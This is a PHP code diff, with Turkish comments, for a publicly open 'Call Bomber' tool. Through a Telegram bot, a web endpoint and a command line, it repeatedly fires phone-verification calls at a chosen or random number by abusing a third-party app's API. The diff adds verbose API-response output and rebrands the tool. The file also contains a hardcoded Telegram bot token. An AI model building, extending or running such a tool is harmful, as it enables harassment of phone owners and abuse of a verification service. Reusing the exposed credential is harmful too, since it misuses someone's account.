@@ -3,6 +3,7 @@
  * Ritalin Tool Call Bomber - PHP Birebir Çeviri + TELEGRAM BOT (HERKESE AÇIK)
  * Orijinal Python kodunun tam çevirisi, sürekli döngü, session desteği ve Telegram bot entegrasyonu ile
  * YETKİ KONTROLÜ YOK - HERKES KULLANABİLİR
+ * Hata olsa bile API yanıtını gösterir
  */
 
 // ==================== KONFIGÜRASYON ====================
@@ -17,8 +18,7 @@ define('LOOP_INTERVAL', 20);
 
 // ==================== TELEGRAM BOT KONFIG ====================
 define('BOT_TOKEN', '8894652888:AAEjzcwqynhFBwoHjwhuGX9vmQnTBGBs61g');
-define('WEBHOOK_URL', 'https://freeapiservice-q08q.onrender.com/ritalin.php');
-// YETKİ KONTROLÜ YOK - ADMIN_CHAT_ID KALDIRILDI
+define('WEBHOOK_URL', 'https://freeapiservice-q08q.onrender.com/arama.php');
 
 // ==================== GLOBAL DEĞİŞKENLER ====================
 $GLOBALS['session_cookies'] = '';
@@ -193,7 +193,7 @@ function processTelegramCommand($chatId, $text) {
     
     switch ($command) {
         case '/start':
-            sendTelegramMessage($chatId, "📞 <b>Ritalin Call Bomber</b>\n\n"
+            sendTelegramMessage($chatId, "📞 <b> Call Bomber</b>\n\n"
                 . "✅ Herkes kullanabilir!\n\n"
                 . "Komutlar:\n"
                 . "/call +905551234567 - Arama gönder\n"
@@ -217,11 +217,15 @@ function processTelegramCommand($chatId, $text) {
                 numaraDogrula($phone, $androidId);
                 $result = aramaDogrula($phone, $androidId);
                 
+                // 🔥 HATA OLSA BİLE API YANITINI GÖNDER
+                $responseText = "📊 <b>API Yanıtı:</b>\n";
+                $responseText .= "<pre>" . htmlspecialchars(json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)) . "</pre>";
+                
                 if (isset($result['status']) && $result['status'] === 'ok') {
-                    sendTelegramMessage($chatId, "✅ Arama gönderildi: $phone");
+                    sendTelegramMessage($chatId, "✅ Arama gönderildi: $phone\n\n" . $responseText);
                 } else {
                     $reason = $result['reason'] ?? 'Bilinmeyen';
-                    sendTelegramMessage($chatId, "❌ Hata: $reason");
+                    sendTelegramMessage($chatId, "❌ Hata: $reason\n\n" . $responseText);
                 }
             } catch (Exception $e) {
                 sendTelegramMessage($chatId, "❌ Hata: " . $e->getMessage());
@@ -243,11 +247,15 @@ function processTelegramCommand($chatId, $text) {
                 numaraDogrula($randomPhone, $androidId);
                 $result = aramaDogrula($randomPhone, $androidId);
                 
+                // 🔥 HATA OLSA BİLE API YANITINI GÖNDER
+                $responseText = "📊 <b>API Yanıtı:</b>\n";
+                $responseText .= "<pre>" . htmlspecialchars(json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)) . "</pre>";
+                
                 if (isset($result['status']) && $result['status'] === 'ok') {
-                    sendTelegramMessage($chatId, "✅ Arama gönderildi: $randomPhone");
+                    sendTelegramMessage($chatId, "✅ Arama gönderildi: $randomPhone\n\n" . $responseText);
                 } else {
                     $reason = $result['reason'] ?? 'Bilinmeyen';
-                    sendTelegramMessage($chatId, "❌ Hata: $reason");
+                    sendTelegramMessage($chatId, "❌ Hata: $reason\n\n" . $responseText);
                 }
             } catch (Exception $e) {
                 sendTelegramMessage($chatId, "❌ Hata: " . $e->getMessage());
@@ -283,40 +291,52 @@ if (php_sapi_name() !== 'cli') {
         $text = $update['message']['text'] ?? '';
         $username = $update['message']['from']['username'] ?? 'bilinmeyen';
         
-        // 🔓 HERKES KULLANABİLİR - Admin kontrolü yok
-        
         processTelegramCommand($chatId, $text);
         exit;
     }
     
-    // Normal HTTP isteği
+    // Normal HTTP isteği - API yanıtını her zaman döndür
     $phone = $_GET['phone'] ?? $_POST['phone'] ?? null;
     if ($phone) {
         $phone = trim($phone);
         $androidId = (MODE === 'TEST_RANDOM_IDS') ? null : '13e50e93a6399e67';
         
+        $responseData = [
+            'success' => false,
+            'phone' => $phone,
+            'steps' => []
+        ];
+        
         try {
-            kimlikListesi($androidId);
-            calistir($androidId);
-            butonDurum($androidId);
-            numaraDogrula($phone, $androidId);
-            $result = aramaDogrula($phone, $androidId);
+            $result = kimlikListesi($androidId);
+            $responseData['steps']['auth_list'] = $result;
             
-            header('Content-Type: application/json');
-            echo json_encode([
-                'success' => isset($result['status']) && $result['status'] === 'ok',
-                'phone' => $phone,
-                'response' => $result
-            ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
+            $result = calistir($androidId);
+            $responseData['steps']['run'] = $result;
+            
+            $result = butonDurum($androidId);
+            $responseData['steps']['stat_btns'] = $result;
+            
+            $result = numaraDogrula($phone, $androidId);
+            $responseData['steps']['validate_phonenumber'] = $result;
+            
+            $result = aramaDogrula($phone, $androidId);
+            $responseData['steps']['auth_call'] = $result;
+            
+            $responseData['success'] = isset($result['status']) && $result['status'] === 'ok';
+            $responseData['final_status'] = $result['status'] ?? 'unknown';
+            $responseData['reason'] = $result['reason'] ?? null;
             
         } catch (Exception $e) {
-            header('Content-Type: application/json');
-            echo json_encode(['success' => false, 'error' => $e->getMessage()]);
+            $responseData['error'] = $e->getMessage();
         }
+        
+        header('Content-Type: application/json');
+        echo json_encode($responseData, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
         exit;
     }
     
-    echo json_encode(['status' => 'ok', 'message' => 'Ritalin Call Bomber Aktif - PUBLIC']);
+    echo json_encode(['status' => 'ok', 'message' => ' Call Bomber Aktif - PUBLIC']);
     exit;
 }
 
@@ -330,7 +350,7 @@ if (php_sapi_name() === 'cli') {
     echo "  ██████╔╝██║  ██║███████╗███████╗\n";
     echo "  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝\n";
     echo "\033[0m";
-    echo "\033[1;30;40m\t\t Ritalin Tool Call Bomber\n\033[0m";
+    echo "\033[1;30;40m\t\t  Tool Call Bomber\n\033[0m";
     
     echo "\033[96mNumara gir (+90xx): \033[0m";
     $phone = trim(fgets(STDIN));
@@ -369,6 +389,8 @@ if (php_sapi_name() === 'cli') {
             echo "\033[92m$phone:\033[0m ";
             $result = aramaDogrula($phone, $androidId);
             echo json_encode($result) . "\n";
+            
+            echo "\033[93m📊 API Yanıtı:\033[0m " . json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
             
             if (isset($result['status']) && $result['status'] === 'ok') {
                 echo "\033[92m✓ ARAMA BAŞARIYLA GÖNDERİLDİ! ($phone)\033[0m\n";
